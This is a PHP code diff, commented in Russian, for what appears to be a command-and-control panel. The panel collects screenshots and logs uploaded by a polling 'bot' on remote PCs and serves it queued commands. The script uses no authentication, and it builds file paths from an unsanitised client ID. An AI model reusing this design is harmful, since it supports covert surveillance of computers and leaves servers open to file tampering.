@@ -5,10 +5,17 @@ header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
 $csvUrl = "https://docs.google.com/spreadsheets/d/e/2PACX-1vTdx2B6KMZldMKf_mGRigmL0AqP0DtaNmaHeJhJQI31AJgd1hIgRMFk_Mv5DlDKm0AzI_mJF0Lfg7Ev/pub?gid=0&single=true&output=csv";
 $googleExecUrl = "https://script.google.com/macros/s/AKfycbzM-qCeDJlu8YA6b04MSBIPt2E0WjLBt2yNBQqXzrva38HnSZ2vNPt4rx1SU9DLoAZjow/exec";
 
-// 1. ПРИЕМ СКРИНШОТОВ (Сохраняем до 3 штук на каждый IP)
+// АВТОМАТИЧЕСКАЯ ЧИСТКА ЗАВИСШИХ КОМАНД (Сгорают через 40 секунд)
+$all_files = glob("cmd_*.txt");
+foreach ($all_files as $file) {
+    if (file_exists($file) && (time() - filemtime($file)) > 40) {
+        @unlink($file); // Удаляем команду, если бот не забрал её вовремя
+    }
+}
+
+// ПРИЕМ СКРИНШОТОВ (Сохраняем до 3 штук на каждый IP)
 if (isset($_FILES['screen']) && isset($_POST['pc_id'])) {
     $ip = $_POST['pc_id'];
-    // Сдвигаем старые скрины: 2 становится 3, 1 становится 2
     if (file_exists("screen_{$ip}_2.jpg")) @rename("screen_{$ip}_2.jpg", "screen_{$ip}_3.jpg");
     if (file_exists("screen_{$ip}_1.jpg")) @rename("screen_{$ip}_1.jpg", "screen_{$ip}_2.jpg");
     
@@ -16,16 +23,23 @@ if (isset($_FILES['screen']) && isset($_POST['pc_id'])) {
     exit("ok");
 }
 
-// 2. ПРИЕМ ТЕКСТОВЫХ ЛОГОВ (Для каждого ПК свой лог)
+// ПРИЕМ ТЕКСТОВЫХ ЛОГОВ
 if (isset($_POST['log']) && isset($_POST['pc_id'])) {
     $ip = $_POST['pc_id'];
     file_put_contents("log_{$ip}.txt", $_POST['log']);
     exit("ok");
 }
 
-// ОБРАБОТКА КОМАНД ДЛЯ БОТА
-if (isset($_GET['get_cmd'])) { $file = "cmd_{$_GET['pc_id']}.txt"; echo file_exists($file) ? file_get_contents($file) : "none"; exit; }
-if (isset($_GET['clear_cmd'])) { @unlink("cmd_{$_GET['pc_id']}.txt"); exit("ok"); }
+// ОТДАЧА КОМАНД БОТУ
+if (isset($_GET['get_cmd'])) { 
+    $file = "cmd_{$_GET['pc_id']}.txt"; 
+    echo file_exists($file) ? file_get_contents($file) : "none"; 
+    exit; 
+}
+if (isset($_GET['clear_cmd'])) { 
+    @unlink("cmd_{$_GET['pc_id']}.txt"); 
+    exit("ok"); 
+}
 
 // ОБРАБОТКА ФОРМЫ ИМЕНИ / ПЕРЕИМЕНОВАНИЯ
 if (isset($_POST['rename_pc'])) {
@@ -59,17 +73,15 @@ if ($data !== false) {
         if (empty($ip)) continue;
         
         if (empty($name)) {
-            // Если имени нет, отправляем в список "Новые запросы"
             $unnamed_ips[$ip] = $time;
         } else {
-            // Если имя есть, формируем личную панель ПК
             if (!isset($named_pcs[$ip])) {
                 $named_pcs[$ip] = ['name' => $name, 'history' => [], 'is_online' => false];
             }
             $named_pcs[$ip]['history'][] = "[{$time}] {$status}";
             
-            // Проверка на "Онлайн" (если последний пинг был меньше 15 секунд назад)
-            if (strtotime($time) > (time() - 15)) {
+            // Поскольку бот пишет раз в 30 сек, онлайн держим 45 секунд, чтобы не моргал статус
+            if (strtotime($time) > (time() - 45)) {
                 $named_pcs[$ip]['is_online'] = true;
             }
         }
